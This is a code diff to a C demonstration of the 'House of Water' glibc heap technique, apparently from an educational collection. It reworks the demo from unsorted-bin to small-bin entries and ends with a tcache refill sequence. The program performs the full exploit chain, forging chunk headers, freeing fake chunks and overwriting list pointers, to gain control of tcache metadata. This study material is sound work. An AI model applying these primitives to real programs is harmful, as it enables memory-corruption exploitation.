@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <assert.h>
+#include <unistd.h>
 
 /* 
  * House of Water is a technique for converting a Use-After-Free (UAF) vulnerability into a t-cache 
@@ -14,13 +15,13 @@
  * size "0x10001" is created.
  * 
  * This fake heap chunk header happens to be positioned above the 0x20 and 0x30 t-cache linked 
- * address entries, enabling the creation of a fully functional fake unsorted-bin entry.
+ * address entries, enabling the creation of a fully functional fake small-bin entry.
  * 
  * The correct size should be set for the chunk, and the next chunk's prev-in-use bit 
  * must be 0. Therefore, from the fake t-cache metadata chunk+0x10000, the appropriate values 
  * should be written.
  *
- * Finally, due to the behavior of allocations from unsorted-bins, once t-cache metadata control
+ * Finally, due to the behavior of allocations from small-bins, once t-cache metadata control
  * is achieved, a libc pointer can also be inserted into the metadata. This allows the libc pointer
  * to be ready for allocation as well.
  *
@@ -86,25 +87,25 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 2: Create the unsorted bins linked list, used for hijacking at a later time
+	// Step 2: Create the small bins linked list, used for hijacking at a later time
 	puts("Now, allocate three 0x90 chunks with guard chunks in between. This prevents");
 	puts("chunk-consolidation and sets our target for the house of water attack.");
 	puts("\t- chunks:");
 	
-	void *unsorted_start = malloc(0x88);
-	printf("\t\t* unsorted_start\t@ %p\n", unsorted_start);
+	void *small_start = malloc(0x88);
+	printf("\t\t* small_start\t@ %p\n", small_start);
 	_ = malloc(0x18); // Guard chunk
 	
 	puts("\t\t* /guard/");
 
-	void *unsorted_middle = malloc(0x88);
-	printf("\t\t* unsorted_middle\t@ %p\n", unsorted_middle);
+	void *small_middle = malloc(0x88);
+	printf("\t\t* small_middle\t@ %p\n", small_middle);
 	_ = malloc(0x18); // Guard chunk
 	
 	puts("\t\t* /guard/");
 	
-	void *unsorted_end = malloc(0x88);
-	printf("\t\t* unsorted_end\t\t@ %p\n", unsorted_end);
+	void *small_end = malloc(0x88);
+	printf("\t\t* small_end\t\t@ %p\n", small_end);
 	_ = malloc(0x18); // Guard chunk
 	
 	puts("\t\t* /guard/");
@@ -119,7 +120,7 @@ int main(void) {
 	puts("\n");
 
 	// Step 3: Satisfy the conditions for a free'd chunk, namely having the correct size at the end of the chunk and
-	// a size field next to it having it's prev-in-use bit set to 0	
+	// a size field next to it having it's prev-in-use bit set to 0
 	puts("Make an allocation to reach the end of the faked chunk");
 	
 	_ = malloc(0xf000);		  // Padding
@@ -151,8 +152,8 @@ int main(void) {
 
 	// Step 4: Free t-cache entries
 	puts("Fill up the 0x90 t-cache with the chunks allocated from earlier by freeing them.");	
-	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the unsorted-bin");
-	puts("instead of the t-cache or small-bins.");
+	puts("By doing so, the next time a 0x88 chunk is free'd, it ends up in the small-bin");
+	puts("instead of the t-cache.");
 	for (int i = 0; i < 7; i++) {
 		free(x[i]);
 	}
@@ -165,31 +166,31 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 	
-	// Step 5: Create a 0x20 and a 0x30 t-cache entry which overlaps unsorted_start and unsorted_end.
+	// Step 5: Create a 0x20 and a 0x30 t-cache entry which overlaps small_start and small_end.
 	// By doing this, we can blindly fake a FWD and BCK pointer in the t-cache metadata!
 		
 	puts("Here comes the trickiest part!\n");
 	
 	puts("We essentially want a pointer in the 0x20 t-cache metadata to act as a FWD\n"
 	"pointer and a pointer in the 0x30 t-cache to act as a BCK pointer.");
-	puts("We want it such that it points to the chunk header of our unsorted bin entries,\n"
+	puts("We want it such that it points to the chunk header of our small bin entries,\n"
 	"and not at the chunk itself which is common for t-cache.\n");
 	
 	puts("Using a technique like house of botcake or a stronger arb-free primitive, free a");
-	puts("chunk such that it overlaps with the header of unsorted_start and unsorte_end.");
+	puts("chunk such that it overlaps with the header of small_start and small_end.");
 	puts("");
 
 	puts("It should look like the following:");
 	puts("");
 	
-	puts("unsorted_start:");
-	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x30][0/1], unsortedbin[all][0]\n", (unsigned long)(unsorted_start-0x10), *(long *)(unsorted_start-0x10), *(long *)(unsorted_start-0x8));
-	dump_memory(unsorted_start, 2);
+	puts("small_start:");
+	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x30][0/1], small[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
+	dump_memory(small_start, 2);
 	puts("");
 
-	puts("unsorted_end:");
-	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x20][0/1], unsortedbin[all][2]\n", (unsigned long)(unsorted_end-0x10), *(long *)(unsorted_end-0x10), *(long *)(unsorted_end-0x8));
-	dump_memory(unsorted_end, 2);
+	puts("small_end:");
+	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x20][0/1], smallbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
+	dump_memory(small_end, 2);
 
 	puts("\n");
 	puts("If you want to see a blind example using only double free, see the following chal: ");
@@ -206,26 +207,26 @@ int main(void) {
 	puts("\n");
 
 	// Step 5 part 1:
-	puts("Write 0x31 above unsorted_start to enable its freeing into the 0x30 t-cache.");
-	printf("\t*%p-0x18 = 0x31\n", unsorted_start);
-	*(long*)(unsorted_start-0x18) = 0x31; 
+	puts("Write 0x31 above small_start to enable its freeing into the 0x30 t-cache.");
+	printf("\t*%p-0x18 = 0x31\n", small_start);
+	*(long*)(small_start-0x18) = 0x31;
 	puts("");
 
-	puts("This creates a 0x31 entry just above unsorted_start, which looks like the following:");
-	dump_memory(unsorted_start-0x20, 3);
+	puts("This creates a 0x31 entry just above small_start, which looks like the following:");
+	dump_memory(small_start-0x20, 3);
 	puts("");
 
-	printf("Free the faked 0x31 chunk @ %p\n", unsorted_start-0x10);
-	free(unsorted_start-0x10); // Create a fake FWD
+	printf("Free the faked 0x31 chunk @ %p\n", small_start-0x10);
+	free(small_start-0x10); // Create a fake FWD
 	puts("");
 	
 	puts("Finally, because of the meta-data created by free'ing the 0x31 chunk, we need to");
-	puts("restore the original header of the unsorted_start chunk by restoring the 0x91 header:");
-	printf("\t*%p-0x8 = 0x91\n", unsorted_start);
-	*(long*)(unsorted_start-0x8) = 0x91; 
+	puts("restore the original header of the small_start chunk by restoring the 0x91 header:");
+	printf("\t*%p-0x8 = 0x91\n", small_start);
+	*(long*)(small_start-0x8) = 0x91;
 	puts("");
 
-	puts("Now, let's do the same for unsorted_end except using a 0x21 faked chunk.");
+	puts("Now, let's do the same for small_end except using a 0x21 faked chunk.");
 	puts("");
 
 
@@ -235,22 +236,22 @@ int main(void) {
 	puts("\n");
 
 	// Step 5 part 2:
-	puts("Write 0x21 above unsorted_end, such that it can be free'd in to the 0x20 t-cache:");
-	printf("\t*%p-0x18 = 0x21\n", unsorted_end);
-	*(long*)(unsorted_end-0x18) = 0x21; 
+	puts("Write 0x21 above small_end, such that it can be free'd in to the 0x20 t-cache:");
+	printf("\t*%p-0x18 = 0x21\n", small_end);
+	*(long*)(small_end-0x18) = 0x21;
 	puts("");
 	
-	puts("This creates a 0x21 just above unsorted_end, which looks like the following:");
-	dump_memory(unsorted_end-0x20, 3);
+	puts("This creates a 0x21 just above small_end, which looks like the following:");
+	dump_memory(small_end-0x20, 3);
 	puts("");
 	
-	printf("Free the faked 0x21 chunk @ %p\n", unsorted_end-0x10);
-	free(unsorted_end-0x10); // Create a fake BCK
+	printf("Free the faked 0x21 chunk @ %p\n", small_end-0x10);
+	free(small_end-0x10); // Create a fake BCK
 	puts("");
 	
-	puts("restore the original header of the unsorted_end chunk by restoring the 0x91 header:");
-	printf("\t*%p-0x8 = 0x91\n", unsorted_end);
-	*(long*)(unsorted_end-0x8) = 0x91; 
+	puts("restore the original header of the small_end chunk by restoring the 0x91 header:");
+	printf("\t*%p-0x8 = 0x91\n", small_end);
+	*(long*)(small_end-0x8) = 0x91;
 	puts("");
 
 	
@@ -260,17 +261,17 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 6: Create the unsorted bin list
-	puts("Now, let's free the unsorted bin entries!");
+	// Step 6: Create the small bin list
+	puts("Now, let's free the small bin entries!");
 	
-	puts("\t> free(unsorted_end);");
-	free(unsorted_end);
+	puts("\t> free(small_end);");
+	free(small_end);
 	
-	puts("\t> free(unsorted_middle);");
-	free(unsorted_middle);
+	puts("\t> free(small_middle);");
+	free(small_middle);
 	
-	puts("\t> free(unsorted_start);");
-	free(unsorted_start);
+	puts("\t> free(small_start);");
+	free(small_start);
 	
 	puts("\n");
 
@@ -278,9 +279,9 @@ int main(void) {
 	
 	puts("At this point, our heap looks something like this:");
 	
-	printf("\t- Unsorted bin:\n");
-	puts("\t\tunsorted_start <--> unsorted_middle <--> unsorted_end");
-	printf("\t\t%p <--> %p <--> %p\n", unsorted_start-0x10, unsorted_middle-0x10, unsorted_end-0x10);
+	printf("\t- Small bin:\n");
+	puts("\t\tsmall_start <--> small_middle <--> small_end");
+	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, small_middle-0x10, small_end-0x10);
 	
 	printf("\t- 0x20 t-cache:\n");
 	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x90));
@@ -292,8 +293,8 @@ int main(void) {
 	dump_memory(metadata+0x70, 4);
 	puts("");
 
-	puts("We can now observe that the 0x30 t-cache points to unsorted_start and 0x20 t-cache points to ");
-	puts("unsorted_end, which is what we need to fake an unsorted-bin entry and hijack unsorted_middle.");
+	puts("We can now observe that the 0x30 t-cache points to small_start and 0x20 t-cache points to ");
+	puts("small_end, which is what we need to fake an small-bin entry and hijack small_middle.");
 
 
 	puts("\n");
@@ -302,29 +303,29 @@ int main(void) {
 	puts("\t==============================");
 	puts("\n");
 
-	// Step 7: Overwrite LSB of unsorted_start and unsorted_end to point to the fake t-cache metadata chunk
-	puts("Finally, all there is left to do is simply overwrite the LSB of unsorted_start FWD-");
-	puts("and BCK pointer for unsorted_end to point to the faked t-cache metadata chunk.");
+	// Step 7: Overwrite LSB of small_start and small_end to point to the fake t-cache metadata chunk
+	puts("Finally, all there is left to do is simply overwrite the LSB of small_start FWD-");
+	puts("and BCK pointer for small_end to point to the faked t-cache metadata chunk.");
 	puts("");
 	
 	/* VULNERABILITY */
-	printf("\t- unsorted_start:\n");
-	printf("\t\t*%p = %p\n", unsorted_start, metadata+0x80); 
-	*(unsigned long *)unsorted_start = (unsigned long)(metadata+0x80);
+	printf("\t- small_start:\n");
+	printf("\t\t*%p = %p\n", small_start, metadata+0x80);
+	*(unsigned long *)small_start = (unsigned long)(metadata+0x80);
 	puts("");
 
-	printf("\t- unsorted_end:\n");
-	printf("\t\t*%p = %p\n", unsorted_end, metadata+0x80); 
-	*(unsigned long *)(unsorted_end+0x8) = (unsigned long)(metadata+0x80);
+	printf("\t- small_end:\n");
+	printf("\t\t*%p = %p\n", small_end, metadata+0x80); 
+	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x80);
 	puts("");
 	/* VULNERABILITY */
 
-	puts("At this point, the unsorted bin will look like the following:");
+	puts("At this point, the small bin will look like the following:");
 	puts("");
 
-	puts("\t- unsorted bin:");
-	printf("\t\t unsorted_start <--> metadata chunk <--> unsorted_end\n");
-	printf("\t\t %p\t     %p      %p\n", unsorted_start, metadata+0x80, unsorted_end);
+	puts("\t- small bin:");
+	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
+	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x80, small_end);
 
 
 	puts("\n");
@@ -334,37 +335,19 @@ int main(void) {
 	puts("\n");
 
 	// Step 8: allocate to win
-	puts("Now, simply just allocate a chunk that's within the 0x10000 range");
-	puts("to allocate from the faked chunk. As an example, we will allocate a 0x288:");
-	
-	puts("\t- 0x288 chunk:");
+	puts("Now, we can get the metadata chunk by doing 10 allocations:");
+	puts("\t7 for tcachebins");
+	puts("\t1 for small_start, which triggers the reverse refilling logic (moving chunks from smallbin to tcache)");
+	puts("\t1 for small_end, it is out first because revere refilling reverses the linked list");
+	puts("\tand the last one is our tcache metadata chunk");
 
+	for(int i=0; i<9; i++) malloc(0x88);
+	
 	// Next allocation *could* be our faked chunk!
-	void *meta_chunk = malloc(0x288);
+	void *meta_chunk = malloc(0x88);
 
 	printf("\t\tNew chunk\t @ %p\n", meta_chunk);
 	printf("\t\tt-cache metadata @ %p\n", metadata);
 	assert(meta_chunk == (metadata+0x90)); 
 	puts("");
-
-	
-	puts("\n");
-	puts("\t==============================");
-	puts("\t|           BONUS!           |");
-	puts("\t==============================");
-	puts("\n");
-
-	// BONUS!	
-	puts("Whilst the primary goal of this house is to provide a leakless way");
-	puts("to gain t-cache control by overwriting LSB, a nice bonus is the free LIBC");
-	puts("pointer we get as an added bonus to the method!");
-	puts("");
-
-	puts("This is what the t-cache metadata will look like after we allocated the");
-	puts("t-cache metadata chunk:");
-	dump_memory(metadata+0x70, 4);
-	puts("");
-
-
-	puts("Notice how the 0x20 and 0x30 t-cache now contains a libc pointer to the main_arena.");
 }
